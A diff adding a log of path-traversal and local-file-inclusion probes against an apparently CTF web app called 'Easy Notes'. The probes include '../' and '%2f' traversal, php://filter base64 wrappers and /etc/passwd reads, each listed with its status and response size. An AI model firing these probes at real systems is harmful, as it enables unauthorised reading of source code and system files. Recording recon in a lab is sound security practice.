@@ -1,0 +1,16 @@
+01	home	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+02	flag	200	2125	text/html; charset=UTF-8	Easy Notes Easy Notes You are not an admin 
+03	../config	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+04	../index	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+05	../includes/functions	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+06	../includes/function	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+07	../includes/utils	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+08	../includes/config	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+09	php://filter/convert.base64-encode/resource=index	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+10	php://filter/convert.base64-encode/resource=pages/flag	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+11	../php://filter/convert.base64-encode/resource=index	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+12	..%2fconfig	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+13	..%2findex	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+14	..%2fpages%2fflag	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+15	/etc/passwd	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
+16	../../../etc/passwd	200	2432	text/html; charset=UTF-8	Easy Notes Easy Notes Easy Notes 
